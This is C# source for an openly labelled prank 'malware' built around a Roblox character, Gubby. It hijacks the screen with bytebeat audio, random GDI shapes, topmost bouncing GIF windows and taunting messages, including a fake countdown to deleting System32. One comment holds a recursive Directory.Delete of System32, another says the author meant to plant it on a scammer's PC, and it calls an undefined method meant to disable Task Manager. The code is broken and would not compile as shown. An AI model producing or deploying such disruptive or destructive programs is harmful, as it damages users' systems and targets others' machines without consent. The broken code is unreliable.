using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Media;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using Timer = System.Threading.Timer;
using System.Windows.Forms;

// Place this at the top of Main(), before any threads or payloads run
DialogResult result = MessageBox.Show(
    "THIS DESTRUCTIVE MALWARE CAN DISABLE TASK MANAGER AND MAY CAUSE A BSOD.\n\nPLEASE RUN THIS ON A VIRTUAL MACHINE ONLY.\n\nDo you want to continue?",
    MessageBoxButtons.YesNo,
    MessageBoxIcon.Warning
);

if (result == DialogResult.No)
    return; // Exit immediately if the user hits No

class GubbyPayload2
{
    const int SAMPLE_RATE = 8000;
    const int DURATION_SECONDS = 10;

    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [STAThread]
    static void Main()
    {
        new Thread(PlayBytebeat).Start();
        new Thread(BlastGDI).Start();
        new Thread(Payload4).Start();
        Application.Run(); // Keeps bouncing GIF windows alive
    }

    static void PlayBytebeat()
    {
        int totalSamples = SAMPLE_RATE * DURATION_SECONDS;
        byte[] buffer = new byte[totalSamples];

        for (int t = 0; t < totalSamples; t++)
        {
            buffer[t] = (byte)(
                (t * ((3 + (1 ^ ((t >> 10) & 5))) * (5 + (3 & (t >> 14))))) >>
                ((t >> 8) & 3)
            );
        }

        using (var ms = new MemoryStream())
        using (var bw = new BinaryWriter(ms))
        {
            bw.Write(System.Text.Encoding.ASCII.GetBytes("RIFF"));
            bw.Write(36 + buffer.Length);
            bw.Write(System.Text.Encoding.ASCII.GetBytes("WAVEfmt "));
            bw.Write(16);
            bw.Write((short)1); // PCM
            bw.Write((short)1); // Mono
            bw.Write(SAMPLE_RATE);
            bw.Write(SAMPLE_RATE);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(System.Text.Encoding.ASCII.GetBytes("data"));
            bw.Write(buffer.Length);
            bw.Write(buffer);
            bw.Flush();

            ms.Position = 0;
            new SoundPlayer(ms).PlaySync();
        }
    }

    static void BlastGDI()
    {
        Random rand = new Random();
        Graphics g = Graphics.FromHwnd(GetDesktopWindow());

        for (int i = 0; i < 500; i++)
        {
            Brush b = new SolidBrush(Color.FromArgb(rand.Next(256), rand.Next(256), rand.Next(256)));
            int x = rand.Next(1920), y = rand.Next(1080);
            int w = rand.Next(100, 400), h = rand.Next(100, 400);

            g.FillEllipse(b, x, y, w, h);
            Thread.Sleep(10);
            g.FillRectangle(b, x, y, w, h);
            Thread.Sleep(10);
        }
    }

    public static void Payload4()
    {
        Task.Run(() =>
        {
            byte[] buffer = new byte[SAMPLE_RATE];
            for (int t = 0; t < buffer.Length; t++)
            {
                buffer[t] = (byte)(17 * t | (t >> 2) + (14 - ((t >> 15) & 1)) * t | (t >> 3) | (t >> 5));
            }

            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                bw.Write("RIFF".ToCharArray());
                bw.Write(36 + buffer.Length);
                bw.Write("WAVEfmt ".ToCharArray());
                bw.Write(16);
                bw.Write((short)1);
                bw.Write((short)1);
                bw.Write(SAMPLE_RATE);
                bw.Write(SAMPLE_RATE);
                bw.Write((short)1);
                bw.Write((short)8);
                bw.Write("data".ToCharArray());
                bw.Write(buffer.Length);
                bw.Write(buffer);

                ms.Position = 0;
                new SoundPlayer(ms).Play();
            }
        });

        Process.Start(new ProcessStartInfo
        {
            FileName = "https://forsaken2024.fandom.com/wiki/Gubby",
            UseShellExecute = true
        });

        ShowBouncingGif("gubby_roblox.gif");

        Timer timer = new Timer(_ =>
        {
            for (int i = 0; i < 10; i++)
                ShowBouncingGif("gubby_roblox.gif");

            Task.Run(() =>
            {
                Graphics g = Graphics.FromHwnd(IntPtr.Zero);
                Font font = new Font("Arial", 24); //whats it like in birmingham
                Brush brush = Brushes.Red;
                Random rnd = new Random(); 

                while (true)
                {
                    int x = rnd.Next(Screen.PrimaryScreen.Bounds.Width);
                    int y = rnd.Next(Screen.PrimaryScreen.Bounds.Height);
                    string[] phrases = {
                        "GUBBY",
                        "HELP ME MY COMPUTER HAS A VIRUS",
                        "SAY BYE BYE TO UR FILES",
                        "GUBBY IS WATCHING YOU",
                        "GUBBY IS THE BEST XDDDD",
                        "DID YOU KNOW THAT I OBLITERATED YOUR PC 2DAY???? LOLL",
                        "SUBSPACE TRIPMINE"
                    };
                    g.DrawString(phrases[rnd.Next(phrases.Length)], font, brush, x, y);
                    Thread.Sleep(100);
                }
            });

        }, null, 15000, Timeout.Infinite);
    }

    public static void ShowBouncingGif(string filename)
    {
        Form gifForm = new Form
        {
            FormBorderStyle = FormBorderStyle.None,
            TopMost = true,
            BackColor = Color.Magenta,
            TransparencyKey = Color.Magenta,
            Size = new Size(256, 256),
            StartPosition = FormStartPosition.Manual
        };

        PictureBox pb = new PictureBox
        {
            Image = Image.FromFile(filename),
            SizeMode = PictureBoxSizeMode.StretchImage,
            Dock = DockStyle.Fill
        };
        gifForm.Controls.Add(pb);

        Random rnd = new Random();
        int x = rnd.Next(Screen.PrimaryScreen.Bounds.Width - 256);
        int y = rnd.Next(Screen.PrimaryScreen.Bounds.Height - 256);
        gifForm.Location = new Point(x, y);

        int dx = 4, dy = 4;

        var moveTimer = new System.Windows.Forms.Timer { Interval = 10 };
        moveTimer.Tick += (s, e) =>
        {
            var loc = gifForm.Location;
            if (loc.X <= 0 || loc.X + gifForm.Width >= Screen.PrimaryScreen.Bounds.Width) dx = -dx;
            if (loc.Y <= 0 || loc.Y + gifForm.Height >= Screen.PrimaryScreen.Bounds.Height) dy = -dy;
            gifForm.Location = new Point(loc.X + dx, loc.Y + dy);
        };

        moveTimer.Start();
        gifForm.Show(); // I WAS GONNA MAKE IT DISABLE TASK MANAGER BUT IDK HOW 2
        disabletaskmanager(); // this was added to disable task manager but idk if it works

    }
    public static void Payload3()
{
    // Step 1: Bytebeat Madness
    Task.Run(() =>
    {
        byte[] buffer = new byte[8000];
        for (int t = 0; t < buffer.Length; t++)
        {
            buffer[t] = (byte)(420 * ((5 * t >> 11) | (5 * t >> 1))); //
        }

        using var ms = new MemoryStream();
        using var bw = new BinaryWriter(ms);

        bw.Write("RIFF".ToCharArray());
        bw.Write(36 + buffer.Length);
        bw.Write("WAVEfmt ".ToCharArray());
        bw.Write(16);
        bw.Write((short)1); // PCM
        bw.Write((short)1); // Mono
        bw.Write(8000);
        bw.Write(8000);
        bw.Write((short)1);
        bw.Write((short)8);
        bw.Write("data".ToCharArray());
        bw.Write(buffer.Length);
        bw.Write(buffer);

        ms.Position = 0;
        new SoundPlayer(ms).Play();
    });

    // Step 2: Launch the nugget Gubby GIF
    ShowBouncingGif("nugget_gubby.gif");

    // Step 3: GDI Countdown Text Timer
    var start = DateTime.Now;
    var font = new Font("Consolas", 32, FontStyle.Bold);
    var brush = Brushes.Yellow;
    Graphics g = Graphics.FromHwnd(IntPtr.Zero);
    var timer = new System.Windows.Forms.Timer { Interval = 1000 };

    timer.Tick += (s, e) =>
    {
        int secondsLeft = 60 - (int)(DateTime.Now - start).TotalSeconds;
        if (secondsLeft <= 0)
        {
            timer.Stop();
            g.DrawString("GUBBY DELETED SYSTEM32!!!!!!!OMGGZ!! :O", font, Brushes.Red, 100, 100);
            return;
        }

        g.DrawString($"{secondsLeft} SECONDS UNTIL GUBBY DELETES SYSTEM32", font, brush, 100, 100); // i was gonna put this exe file on a scammers pc but i keep forgetting to do it as i suck at stuff 
    };

    timer.Start();

    // BITBLT
    Task.Run(() =>
    {
        Graphics screen = Graphics.FromHwnd(IntPtr.Zero);
        Random rnd = new Random();
        while (true) // hows the weather in lagos
        {
            int x = rnd.Next(Screen.PrimaryScreen.Bounds.Width);
            int y = rnd.Next(Screen.PrimaryScreen.Bounds.Height);
            int w = rnd.Next(200, 800);
            int h = rnd.Next(200, 800);
            screen.FillRectangle(new SolidBrush(Color.FromArgb(rnd.Next(255), rnd.Next(255), rnd.Next(255))), x, y, w, h);
            Thread.Sleep(20); // Directory.Delete(@"C:\\Windows\\System32", true) was gonna be added but i dnt know how to add dat lolz
        }
    });
}

}
